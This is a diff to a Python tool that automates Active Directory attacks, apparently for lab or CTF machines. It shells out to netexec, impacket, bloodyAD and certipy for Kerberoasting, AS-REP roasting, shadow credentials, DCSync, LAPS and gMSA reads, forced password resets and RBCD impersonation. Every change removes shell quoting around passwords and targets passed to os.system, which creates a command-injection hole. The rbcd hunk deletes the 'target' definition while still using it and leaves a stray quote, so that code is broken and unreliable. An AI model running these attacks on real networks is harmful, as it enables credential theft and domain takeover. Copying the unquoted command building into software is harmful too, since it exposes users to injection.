@@ -15,7 +15,7 @@ def asreproast(box, path):
     elif box.nt_hash:
         cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --asreproast ASREProastables.txt"
     else:
-        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p '{box.password}' --asreproast ASREProastables.txt"
+        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --asreproast ASREProastables.txt"
     cmd2 = 'hashcat -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt'
     config.log_cmd([cmd1,cmd2])
     print(f'\033[96m[$]\033[0m {cmd1}')
@@ -35,7 +35,7 @@ def krbroast(box, path):
     elif box.nt_hash:
         cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --kerberoasting kerberoastables.txt"
     else:
-        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p '{box.password}' --kerberoasting kerberoastables.txt"
+        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --kerberoasting kerberoastables.txt"
     cmd2 = 'hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt'
     config.log_cmd([cmd1,cmd2])
     print(f'\033[96m[$]\033[0m {cmd1}')
@@ -61,7 +61,7 @@ def target_krbroast(box, path):
     elif box.nt_hash:
         cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -H {box.nt_hash} -o targeted_kerberoasting{target}.txt"+opt
     else:
-        cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -p '{box.password}' -o targeted_kerberoasting{target}.txt"+opt
+        cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -p {box.password} -o targeted_kerberoasting{target}.txt"+opt
     cmd2 = f'hashcat -m 13100 targeted_kerberoasting{target}.txt /usr/share/wordlists/rockyou.txt'
     config.log_cmd([cmd1,cmd2])
     os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
@@ -83,7 +83,7 @@ def shadow_creds(box, path):
     elif box.nt_hash:
         cmd = f"certipy-ad shadow -target {box.fqdn} -u {box.username}@{box.domain} -hashes {box.nt_hash} -account {box.target} auto"
     else:
-        cmd = f"certipy-ad shadow -target {box.fqdn} -u {box.username}@{box.domain} -p '{box.password}' -account {box.target} auto"
+        cmd = f"certipy-ad shadow -target {box.fqdn} -u {box.username}@{box.domain} -p {box.password} -account {box.target} auto"
     config.log_cmd(cmd)
     os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
     print(f'\033[96m[$]\033[0m {cmd}')
@@ -98,7 +98,7 @@ def ReadGMSAPassword(box, path):
     elif box.nt_hash:
         cmd = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --gmsa"
     else:
-        cmd = f"netexec ldap {box.fqdn} -u {box.username} -p '{box.password}' --gmsa"
+        cmd = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --gmsa"
     config.log_cmd(cmd)
     print(f'\033[96m[$]\033[0m {cmd}')
     cmd_out = os.popen(cmd).read()
@@ -117,14 +117,14 @@ def ReadLAPSPassword(box, path):
     opt = ''
     print('\033[93m[*]\033[0m Read LAPS password')
     if box.target:
-        opt = f" -computer '{box.target}'"
+        opt = f" -computer {box.target}"
         target = box.target+'-'
     if box.krb:
         cmd = f"{box.krb} impacket-GetLAPSPassword {box.domain}/{box.username} -k -no-pass"+opt
     elif box.nt_hash:
-        cmd = f"impacket-GetLAPSPassword {box.domain}/{box.username}:'{box.password}'"+opt
+        cmd = f"impacket-GetLAPSPassword {box.domain}/{box.username}:{box.password}"+opt
     else:
-        cmd = f"impacket-GetLAPSPassword {box.domain}/{box.username}:'{box.password}'"+opt
+        cmd = f"impacket-GetLAPSPassword {box.domain}/{box.username}:{box.password}"+opt
     print(f'\033[96m[$]\033[0m {cmd}')
     os.system(cmd+f' 2>&1 | tee {target}laps_password.out')
     print('\033[92m[+]\033[0m Read LAPS password\n')
@@ -135,11 +135,11 @@ def ForceChangePassword(box):
     new_password = 'newPassword1!'
     print('\033[93m[*]\033[0m ForceChangePassword')
     if box.krb:
-        cmd = f"{box.krb} bloodyAD --host {box.fqdn} -u {box.username} -p -k set password {box.target} '{new_password}'"
+        cmd = f"{box.krb} bloodyAD --host {box.fqdn} -u {box.username} -p -k set password {box.target} {new_password}"
     elif box.nt_hash:
-        cmd = f"bloodyAD --host {box.fqdn} -u {box.username} -p :{box.nt_hash} set password {box.target} '{new_password}'"
+        cmd = f"bloodyAD --host {box.fqdn} -u {box.username} -p :{box.nt_hash} set password {box.target} {new_password}"
     else:
-        cmd = f"bloodyAD --host {box.fqdn} -u {box.username} -p '{box.password}' set password {box.target} '{new_password}'"
+        cmd = f"bloodyAD --host {box.fqdn} -u {box.username} -p {box.password} set password {box.target} {new_password}"
     config.log_cmd(cmd)
     print(f'\033[96m[$]\033[0m {cmd}')
     os.system(cmd)
@@ -161,7 +161,7 @@ def dcsync(box, path):
     elif box.nt_hash:
         cmd = f"impacket-secretsdump {box.domain}/{box.username}@{box.fqdn} -hashes :{box.nt_hash} -outputfile {outfile}"+opt
     else:
-        cmd = f"impacket-secretsdump {box.domain}/{box.username}:'{box.password}'@{box.fqdn} -outputfile {outfile}"+opt
+        cmd = f"impacket-secretsdump {box.domain}/{box.username}:{box.password}@{box.fqdn} -outputfile {outfile}"+opt
     config.log_cmd(cmd)
     print(f'\033[96m[$]\033[0m {cmd}')
     os.system(cmd)
@@ -217,16 +217,15 @@ def rbcd(box,path):
     os.chdir(path.ws_ccache)
     computer_name = 'RBCDPC'
     computer_password = dacl.addcomputer(box,computer_name)
-    target = box.target.replace("$", "").upper()
     print('\033[93m[*]\033[0m Resource Based Constrained Delegation')
     if box.krb:
-        cmd1 = f"{box.krb} impacket-rbcd {box.domain}/ -dc-host {box.fqdn} -delegate-from '{computer_name}$' -delegate-to '{box.target}$' -action write"
+        cmd1 = f"{box.krb} impacket-rbcd {box.domain}/ -dc-host {box.fqdn} -delegate-from {computer_name} -delegate-to {box.target} -action write"
     elif box.nt_hash:
-        cmd1 = f"impacket-rbcd {box.domain}/{box.username} -hashes :{box.nt_hash} -delegate-from '{computer_name}$' -delegate-to '{box.target}$' -action write"
+        cmd1 = f"impacket-rbcd {box.domain}/{box.username} -hashes :{box.nt_hash} -delegate-from {computer_name} -delegate-to {box.target} -action write"
     else:
-        cmd1 = f"impacket-rbcd {box.domain}/{box.username}:'{box.password}' -delegate-from '{computer_name}$' -delegate-to '{box.target}$' -action write"
+        cmd1 = f"impacket-rbcd {box.domain}/{box.username}:{box.password} -delegate-from {computer_name} -delegate-to {box.target} -action write"
     os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
-    cmd2 = f"impacket-getST {box.domain}/'{computer_name}$':'{computer_password}' -spn host/{target.lower()}.{box.domain} -impersonate administrator"
+    cmd2 = f"impacket-getST {box.domain}/{computer_name}:{computer_password}' -spn host/{target.lower()}.{box.domain} -impersonate administrator"
     config.log_cmd([cmd1,cmd2])
     print(f'\033[96m[$]\033[0m {cmd1}')
     os.system(cmd1)
